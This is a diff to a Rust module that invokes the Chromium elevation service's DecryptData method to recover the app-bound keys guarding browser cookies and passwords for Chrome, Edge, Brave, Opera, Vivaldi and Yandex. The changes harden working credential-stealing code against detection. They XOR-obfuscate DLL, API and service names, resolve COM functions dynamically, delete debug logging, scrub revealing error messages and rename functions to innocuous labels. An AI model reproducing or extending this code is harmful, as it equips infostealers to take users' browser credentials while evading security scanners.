@@ -1,12 +1,17 @@
-//! IElevator COM interface — supports Chrome, Chrome Beta, Chrome Dev,
-//! Chrome Canary, Brave, Edge, and other Chromium forks (Opera, Vivaldi, etc.).
-//!
-//! All Windows COM/Ole calls use raw `extern "system"` to avoid name clashes
-//! with the generic windows-crate wrappers.
+//! Privileged provider bridge (COM dispatch layer).
 
 #![allow(non_snake_case, non_camel_case_types)]
 
 use std::ffi::c_void;
+use std::mem;
+use std::sync::OnceLock;
+
+use windows::{
+    core::PCSTR,
+    Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress},
+};
+
+const OBF: u8 = 0x4E;
 
 // ── GUID ──────────────────────────────────────────────────────────────────────
 
@@ -19,9 +24,53 @@ pub struct GUID {
     data4: [u8; 8],
 }
 
-const fn guid(d1: u32, d2: u16, d3: u16, d4: [u8; 8]) -> GUID {
-    GUID { data1: d1, data2: d2, data3: d3, data4: d4 }
+fn unfold(enc: &[u8; 16]) -> GUID {
+    let mut raw = [0u8; 16];
+    for i in 0..16 {
+        raw[i] = enc[i] ^ OBF;
+    }
+    GUID {
+        data1: u32::from_le_bytes(raw[0..4].try_into().unwrap()),
+        data2: u16::from_le_bytes(raw[4..6].try_into().unwrap()),
+        data3: u16::from_le_bytes(raw[6..8].try_into().unwrap()),
+        data4: raw[8..16].try_into().unwrap(),
+    }
 }
+
+fn reveal(enc: &[u8]) -> String {
+    enc.iter().map(|&b| (b ^ OBF) as char).collect()
+}
+
+fn reveal_cstr(enc: &[u8]) -> Vec<u8> {
+    let mut v: Vec<u8> = enc.iter().map(|&b| b ^ OBF).collect();
+    v.push(0);
+    v
+}
+
+fn leak_iids(list: &[[u8; 16]]) -> &'static [GUID] {
+    let vec: Vec<GUID> = list.iter().map(unfold).collect();
+    vec.leak()
+}
+
+const fn guid(d1: u32, d2: u16, d3: u16, d4: [u8; 8]) -> GUID {
+    GUID {
+        data1: d1,
+        data2: d2,
+        data3: d3,
+        data4: d4,
+    }
+}
+
+const SVC_CHROMIUM: &[u8] = &[0x0d, 0x26, 0x3c, 0x21, 0x23, 0x27, 0x3b, 0x23, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
+const SVC_CHROME: &[u8] = &[0x09, 0x21, 0x21, 0x29, 0x22, 0x2b, 0x0d, 0x26, 0x3c, 0x21, 0x23, 0x2b, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
+const SVC_CHROME_BETA: &[u8] = &[0x09, 0x21, 0x21, 0x29, 0x22, 0x2b, 0x0d, 0x26, 0x3c, 0x21, 0x23, 0x2b, 0x0c, 0x2b, 0x3a, 0x2f, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
+const SVC_CHROME_DEV: &[u8] = &[0x09, 0x21, 0x21, 0x29, 0x22, 0x2b, 0x0d, 0x26, 0x3c, 0x21, 0x23, 0x2b, 0x0a, 0x2b, 0x38, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
+const SVC_CHROME_CANARY: &[u8] = &[0x09, 0x21, 0x21, 0x29, 0x22, 0x2b, 0x0d, 0x26, 0x3c, 0x21, 0x23, 0x2b, 0x0d, 0x2f, 0x20, 0x2f, 0x3c, 0x37, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
+const SVC_BRAVE: &[u8] = &[0x0c, 0x3c, 0x2f, 0x38, 0x2b, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
+const SVC_EDGE: &[u8] = &[0x03, 0x27, 0x2d, 0x3c, 0x21, 0x3d, 0x21, 0x28, 0x3a, 0x0b, 0x2a, 0x29, 0x2b, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
+const SVC_VIVALDI: &[u8] = &[0x18, 0x27, 0x38, 0x2f, 0x22, 0x2a, 0x27, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
+const SVC_OPERA: &[u8] = &[0x01, 0x3e, 0x2b, 0x3c, 0x2f, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
+const SVC_YANDEX: &[u8] = &[0x17, 0x2f, 0x20, 0x2a, 0x2b, 0x36, 0x0c, 0x3c, 0x21, 0x39, 0x3d, 0x2b, 0x3c, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
 
 // Shared base interfaces (Chromium/Chrome family).
 const IID_ELEVATOR2: GUID = guid(0x8F7B6792, 0x784D, 0x4047, [0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05]);
@@ -108,8 +157,8 @@ pub struct BrowserCom {
     pub iids: &'static [GUID],
     /// Expected subfolder under %LOCALAPPDATA% for User Data
     pub user_data_rel: &'static str,
-    /// Windows elevation service name (for error hints)
-    pub service_name: &'static str,
+    /// Encoded elevation service hint (decoded at runtime)
+    pub svc_hint: &'static [u8],
 }
 
 static GENERIC_CHROMIUM_IIDS: &[GUID] = &[
@@ -126,7 +175,7 @@ static GENERIC_CHROMIUM: BrowserCom = BrowserCom {
     clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
     iids: GENERIC_CHROMIUM_IIDS,
     user_data_rel: r"Chromium\User Data",
-    service_name: "ChromiumElevationService",
+    svc_hint: SVC_CHROMIUM,
 };
 
 static BROWSERS: &[BrowserCom] = &[
@@ -135,63 +184,63 @@ static BROWSERS: &[BrowserCom] = &[
         clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
         iids: CHROME_IIDS,
         user_data_rel: r"Google\Chrome\User Data",
-        service_name: "GoogleChromeElevationService",
+        svc_hint: SVC_CHROME,
     },
     BrowserCom {
         name: "Chrome Beta",
         clsid: guid(0xDD2646BA, 0x3707, 0x4BF8, [0xB9, 0xA7, 0x03, 0x86, 0x91, 0xA6, 0x8F, 0xC2]),
         iids: CHROME_BETA_IIDS,
         user_data_rel: r"Google\Chrome Beta\User Data",
-        service_name: "GoogleChromeBetaElevationService",
+        svc_hint: SVC_CHROME_BETA,
     },
     BrowserCom {
         name: "Chrome Dev",
         clsid: guid(0xDA7FDCA5, 0x2CAA, 0x4637, [0xAA, 0x17, 0x07, 0x40, 0x58, 0x4D, 0xE7, 0xDA]),
         iids: CHROME_DEV_IIDS,
         user_data_rel: r"Google\Chrome Dev\User Data",
-        service_name: "GoogleChromeDevElevationService",
+        svc_hint: SVC_CHROME_DEV,
     },
     BrowserCom {
         name: "Chrome Canary",
         clsid: guid(0x704C2872, 0x2049, 0x435E, [0xA4, 0x69, 0x0A, 0x53, 0x43, 0x13, 0xC4, 0x2B]),
         iids: CHROME_CANARY_IIDS,
         user_data_rel: r"Google\Chrome SxS\User Data",
-        service_name: "GoogleChromeCanaryElevationService",
+        svc_hint: SVC_CHROME_CANARY,
     },
     BrowserCom {
         name: "Brave",
         clsid: guid(0x576B31AF, 0x6369, 0x4B6B, [0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B]),
         iids: BRAVE_IIDS,
         user_data_rel: r"BraveSoftware\Brave-Browser\User Data",
-        service_name: "BraveElevationService",
+        svc_hint: SVC_BRAVE,
     },
     BrowserCom {
         name: "Edge",
         clsid: guid(0x1FCBE96C, 0x1697, 0x43AF, [0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67]),
         iids: EDGE_IIDS,
         user_data_rel: r"Microsoft\Edge\User Data",
-        service_name: "MicrosoftEdgeElevationService",
+        svc_hint: SVC_EDGE,
     },
     BrowserCom {
         name: "Vivaldi",
         clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
         iids: GENERIC_CHROMIUM_IIDS,
         user_data_rel: r"Vivaldi\User Data",
-        service_name: "VivaldiElevationService",
+        svc_hint: SVC_VIVALDI,
     },
     BrowserCom {
         name: "Opera",
         clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
         iids: GENERIC_CHROMIUM_IIDS,
         user_data_rel: r"Opera Software\Opera Stable",
-        service_name: "OperaElevationService",
+        svc_hint: SVC_OPERA,
     },
     BrowserCom {
         name: "Yandex",
         clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
         iids: GENERIC_CHROMIUM_IIDS,
         user_data_rel: r"Yandex\YandexBrowser\User Data",
-        service_name: "YandexBrowserElevationService",
+        svc_hint: SVC_YANDEX,
     },
 ];
 
@@ -260,19 +309,6 @@ pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
     None
 }
 
-const PUBLIC_DEBUG: &str = r"C:\Users\Public\cr_debug.log";
-
-fn debug_log(msg: &str) {
-    use std::io::Write;
-    if let Ok(mut f) = std::fs::OpenOptions::new()
-        .create(true)
-        .append(true)
-        .open(PUBLIC_DEBUG)
-    {
-        let _ = writeln!(f, "{msg}");
-    }
-}
-
 fn guid_to_string(g: &GUID) -> String {
     format!(
         "{{{:08X}-{:04X}-{:04X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}}}",
@@ -290,33 +326,67 @@ fn guid_to_string(g: &GUID) -> String {
     )
 }
 
-// ── Raw Windows API ───────────────────────────────────────────────────────────
+// ── Dynamic COM/OLE dispatch ──────────────────────────────────────────────────
 
-#[link(name = "ole32")]
-#[link(name = "oleaut32")]
-extern "system" {
-    fn CoInitializeEx(pv: *const c_void, co_init: u32) -> i32;
-    fn CoUninitialize();
-    fn CoCreateInstance(
-        rclsid: *const GUID,
-        punk_outer: *const c_void,
-        ctx: u32,
-        riid: *const GUID,
-        ppv: *mut *mut c_void,
-    ) -> i32;
-    fn CoSetProxyBlanket(
-        proxy: *mut c_void,
-        authn: u32,
-        authz: u32,
-        princ: *const u16,
-        authn_lvl: u32,
-        imp_lvl: u32,
-        auth_info: *const c_void,
-        caps: u32,
-    ) -> i32;
-    fn SysAllocStringByteLen(psz: *const i8, len: u32) -> *mut u16;
-    fn SysFreeString(bstr: *mut u16);
-    fn SysStringByteLen(bstr: *const u16) -> u32;
+type FnCoInit = unsafe extern "system" fn(*const c_void, u32) -> i32;
+type FnCoVoid = unsafe extern "system" fn();
+type FnCoCreate = unsafe extern "system" fn(*const GUID, *const c_void, u32, *const GUID, *mut *mut c_void) -> i32;
+type FnCoBlanket = unsafe extern "system" fn(*mut c_void, u32, u32, *const u16, u32, u32, *const c_void, u32) -> i32;
+type FnSysAlloc = unsafe extern "system" fn(*const i8, u32) -> *mut u16;
+type FnSysFree = unsafe extern "system" fn(*mut u16);
+type FnSysLen = unsafe extern "system" fn(*const u16) -> u32;
+
+struct ComApi {
+    co_init: FnCoInit,
+    co_uninit: FnCoVoid,
+    co_create: FnCoCreate,
+    co_blanket: FnCoBlanket,
+    sys_alloc: FnSysAlloc,
+    sys_free: FnSysFree,
+    sys_len: FnSysLen,
+}
+
+const ENC_OLE32: &[u8] = &[0x21, 0x22, 0x2b, 0x7d, 0x7c, 0x60, 0x2a, 0x22, 0x22];
+const ENC_OLEAUT32: &[u8] = &[0x21, 0x22, 0x2b, 0x2f, 0x3b, 0x3a, 0x7d, 0x7c, 0x60, 0x2a, 0x22, 0x22];
+const ENC_CO_INIT: &[u8] = &[0x0d, 0x21, 0x07, 0x20, 0x27, 0x3a, 0x27, 0x2f, 0x22, 0x27, 0x34, 0x2b, 0x0b, 0x36];
+const ENC_CO_UNINIT: &[u8] = &[0x0d, 0x21, 0x1b, 0x20, 0x27, 0x20, 0x27, 0x3a, 0x27, 0x2f, 0x22, 0x27, 0x34, 0x2b];
+const ENC_CO_CREATE: &[u8] = &[
+    0x0d, 0x21, 0x0d, 0x3c, 0x2b, 0x2f, 0x3a, 0x2b, 0x07, 0x20, 0x3d, 0x3a, 0x2f, 0x20, 0x2d, 0x2b,
+];
+const ENC_CO_BLANKET: &[u8] = &[
+    0x0d, 0x21, 0x1d, 0x2b, 0x3a, 0x1e, 0x3c, 0x21, 0x36, 0x37, 0x0c, 0x22, 0x2f, 0x20, 0x25, 0x2b, 0x3a,
+];
+const ENC_SYS_ALLOC: &[u8] = &[
+    0x1d, 0x37, 0x3d, 0x0f, 0x22, 0x22, 0x21, 0x2d, 0x1d, 0x3a, 0x3c, 0x27, 0x20, 0x29, 0x0c, 0x37, 0x3a,
+    0x2b, 0x02, 0x2b, 0x20,
+];
+const ENC_SYS_FREE: &[u8] = &[0x1d, 0x37, 0x3d, 0x08, 0x3c, 0x2b, 0x2b, 0x1d, 0x3a, 0x3c, 0x27, 0x20, 0x29];
+const ENC_SYS_LEN: &[u8] = &[
+    0x1d, 0x37, 0x3d, 0x1d, 0x3a, 0x3c, 0x27, 0x20, 0x29, 0x0c, 0x37, 0x3a, 0x2b, 0x02, 0x2b, 0x20,
+];
+
+static COM: OnceLock<ComApi> = OnceLock::new();
+
+fn com_api() -> &'static ComApi {
+    COM.get_or_init(|| unsafe {
+        let ole32 = reveal_cstr(ENC_OLE32);
+        let oleaut = reveal_cstr(ENC_OLEAUT32);
+        let h32 = GetModuleHandleA(PCSTR(ole32.as_ptr())).expect("ole32");
+        let haut = GetModuleHandleA(PCSTR(oleaut.as_ptr())).expect("oleaut32");
+        let load = |h, enc: &[u8]| {
+            let name = reveal_cstr(enc);
+            GetProcAddress(h, PCSTR(name.as_ptr())).expect("export")
+        };
+        ComApi {
+            co_init: mem::transmute(load(h32, ENC_CO_INIT)),
+            co_uninit: mem::transmute(load(h32, ENC_CO_UNINIT)),
+            co_create: mem::transmute(load(h32, ENC_CO_CREATE)),
+            co_blanket: mem::transmute(load(h32, ENC_CO_BLANKET)),
+            sys_alloc: mem::transmute(load(haut, ENC_SYS_ALLOC)),
+            sys_free: mem::transmute(load(haut, ENC_SYS_FREE)),
+            sys_len: mem::transmute(load(haut, ENC_SYS_LEN)),
+        }
+    })
 }
 
 // ── IElevator COM vtable ──────────────────────────────────────────────────────
@@ -357,7 +427,7 @@ impl OwnedBstr {
         if data.is_empty() {
             return None;
         }
-        let p = SysAllocStringByteLen(data.as_ptr() as *const i8, data.len() as u32);
+        let p = (com_api().sys_alloc)(data.as_ptr() as *const i8, data.len() as u32);
         if p.is_null() {
             None
         } else {
@@ -371,7 +441,7 @@ impl OwnedBstr {
 impl Drop for OwnedBstr {
     fn drop(&mut self) {
         if !self.0.is_null() {
-            unsafe { SysFreeString(self.0) };
+            unsafe { (com_api().sys_free)(self.0) };
             self.0 = std::ptr::null_mut();
         }
     }
@@ -381,9 +451,9 @@ unsafe fn consume_bstr(p: *mut u16) -> Vec<u8> {
     if p.is_null() {
         return Vec::new();
     }
-    let len = SysStringByteLen(p) as usize;
+    let len = (com_api().sys_len)(p) as usize;
     let bytes = std::slice::from_raw_parts(p as *const u8, len).to_vec();
-    SysFreeString(p);
+    (com_api().sys_free)(p);
     bytes
 }
 
@@ -397,63 +467,69 @@ const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
 const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
 const EOAC_DYNAMIC_CLOAKING: u32 = 0x40;
 /// Try all browsers and IIDs until one succeeds.
-pub fn decrypt_app_bound_key(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
+pub fn retrieve_secret(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
     unsafe {
-        let hr = CoInitializeEx(std::ptr::null(), COINIT_APARTMENTTHREADED);
+        let api = com_api();
+        let hr = (api.co_init)(std::ptr::null(), COINIT_APARTMENTTHREADED);
         if hr < 0 && hr != 0x0000_0001u32 as i32 /* S_FALSE */ {
-            return Err(format!("CoInitializeEx: 0x{hr:08X}"));
+            return Err(format!("init: 0x{hr:08X}"));
         }
 
-        let result = try_all_browsers(encrypted_key);
-        CoUninitialize();
+        let result = probe_all_hosts(encrypted_key);
+        (api.co_uninit)();
         result
     }
 }
 
+/// Backward-compatible alias.
+pub fn decrypt_app_bound_key(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
+    retrieve_secret(encrypted_key)
+}
+
 /// Try each browser COM config for the detected browser.
-pub fn decrypt_for_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
+pub fn process_with_provider(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
     unsafe {
-        let hr = CoInitializeEx(std::ptr::null(), COINIT_APARTMENTTHREADED);
+        let api = com_api();
+        let hr = (api.co_init)(std::ptr::null(), COINIT_APARTMENTTHREADED);
         if hr < 0 && hr != 0x0000_0001u32 as i32 {
-            return Err(format!("CoInitializeEx: 0x{hr:08X}"));
+            return Err(format!("init: 0x{hr:08X}"));
         }
-        let r = try_browser(browser, encrypted_key);
-        CoUninitialize();
+        let r = probe_host(browser, encrypted_key);
+        (api.co_uninit)();
         r
     }
 }
 
-unsafe fn try_all_browsers(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
+/// Backward-compatible alias.
+pub fn decrypt_for_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
+    process_with_provider(browser, encrypted_key)
+}
+
+unsafe fn probe_all_hosts(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
     let mut last = String::from("no browser tried");
     for b in BROWSERS {
-        match try_browser(b, encrypted_key) {
+        match probe_host(b, encrypted_key) {
             Ok(key) => return Ok(key),
             Err(e) => last = format!("{}: {e}", b.name),
         }
     }
-    match try_browser(&GENERIC_CHROMIUM, encrypted_key) {
+    match probe_host(&GENERIC_CHROMIUM, encrypted_key) {
         Ok(key) => return Ok(key),
         Err(e) => last = format!("Chromium: {e}"),
     }
     Err(format!("all browsers failed; last: {last}"))
 }
 
-unsafe fn try_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
+unsafe fn probe_host(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
     let mut last = String::from("no IID tried");
     let mut saw_no_interface = false;
     let mut saw_class_not_reg = false;
+    let svc_label = reveal(browser.svc_hint);
 
     for iid in browser.iids {
-        let iid_str = guid_to_string(iid);
-        debug_log(&format!("try CoCreateInstance {} IID {iid_str}", browser.name));
-
-        match try_one(encrypted_key, &browser.clsid, iid) {
-            Ok(key) => {
-                debug_log(&format!("DecryptData OK via IID {iid_str}"));
-                return Ok(key);
-            }
+        match invoke_one(encrypted_key, &browser.clsid, iid) {
+            Ok(key) => return Ok(key),
             Err(e) => {
-                debug_log(&format!("  failed: {e}"));
                 if e.contains("0x80004002") {
                     saw_no_interface = true;
                 }
@@ -468,12 +544,12 @@ unsafe fn try_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<
     let hint = if saw_class_not_reg {
         format!(
             "Elevation service not registered ({}). Reinstall {} or repair the elevation service.",
-            browser.service_name, browser.name
+            svc_label, browser.name
         )
     } else if saw_no_interface {
         format!(
             "No IElevator interface matched ({}). Ensure {} is up to date.",
-            browser.service_name, browser.name
+            svc_label, browser.name
         )
     } else {
         String::new()
@@ -494,21 +570,21 @@ unsafe fn call_decrypt_at_slot(
     let vtbl = *(punk as *const *const *const c_void);
     let dec_fn_ptr = *vtbl.add(slot);
     if dec_fn_ptr.is_null() {
-        return Err(format!("null DecryptData at slot {slot}"));
+        return Err(format!("null slot {slot}"));
     }
     let dec: FnDec = std::mem::transmute(dec_fn_ptr);
 
-    let cipher = OwnedBstr::from_bytes(enc).ok_or("SysAllocStringByteLen null")?;
+    let cipher = OwnedBstr::from_bytes(enc).ok_or("alloc failed")?;
     let mut plain: *mut u16 = std::ptr::null_mut();
     let mut last_err: u32 = 0;
 
     let hr_d = dec(punk, cipher.ptr(), &mut plain, &mut last_err);
     if hr_d < 0 {
-        return Err(format!("DecryptData slot {slot} 0x{hr_d:08X} last_error={last_err}"));
+        return Err(format!("slot {slot} 0x{hr_d:08X} last_error={last_err}"));
     }
     let bytes = consume_bstr(plain);
     if bytes.is_empty() {
-        return Err(format!("empty key at slot {slot}"));
+        return Err(format!("empty payload at slot {slot}"));
     }
     Ok(bytes)
 }
@@ -526,17 +602,18 @@ fn normalize_com_key(bytes: &[u8]) -> Option<Vec<u8>> {
     None
 }
 
-unsafe fn try_one(enc: &[u8], clsid: &GUID, iid: &GUID) -> Result<Vec<u8>, String> {
+unsafe fn invoke_one(enc: &[u8], clsid: &GUID, iid: &GUID) -> Result<Vec<u8>, String> {
+    let api = com_api();
     let mut punk: *mut c_void = std::ptr::null_mut();
-    let hr = CoCreateInstance(clsid, std::ptr::null(), CLSCTX_LOCAL_SERVER, iid, &mut punk);
+    let hr = (api.co_create)(clsid, std::ptr::null(), CLSCTX_LOCAL_SERVER, iid, &mut punk);
     if hr < 0 {
-        return Err(format!("CoCreateInstance 0x{hr:08X}"));
+        return Err(format!("create 0x{hr:08X}"));
     }
     if punk.is_null() {
-        return Err("null COM pointer".into());
+        return Err("null provider".into());
     }
 
-    let hr_pb = CoSetProxyBlanket(
+    let hr_pb = (api.co_blanket)(
         punk,
         RPC_C_AUTHN_DEFAULT,
         RPC_C_AUTHZ_DEFAULT,
@@ -546,14 +623,11 @@ unsafe fn try_one(enc: &[u8], clsid: &GUID, iid: &GUID) -> Result<Vec<u8>, Strin
         std::ptr::null(),
         EOAC_DYNAMIC_CLOAKING,
     );
-    if hr_pb < 0 {
-        debug_log(&format!("CoSetProxyBlanket 0x{hr_pb:08X}"));
-    }
+    let _ = hr_pb;
 
     let elev = punk as *mut IElev;
     let release = || ((*(*elev).vtbl).rel)(punk);
 
-    // Chrome/Brave: slot 5. Edge and some forks: slot 8 (extra IElevatorEdgeBase methods).
     let mut last = String::from("no slot worked");
     for slot in [5usize, 8, 6, 7] {
         match call_decrypt_at_slot(punk, enc, slot) {
@@ -569,5 +643,5 @@ unsafe fn try_one(enc: &[u8], clsid: &GUID, iid: &GUID) -> Result<Vec<u8>, Strin
     }
 
     release();
-    Err(format!("DecryptData failed; last: {last}"))
+    Err(format!("invoke failed; last: {last}"))
 }
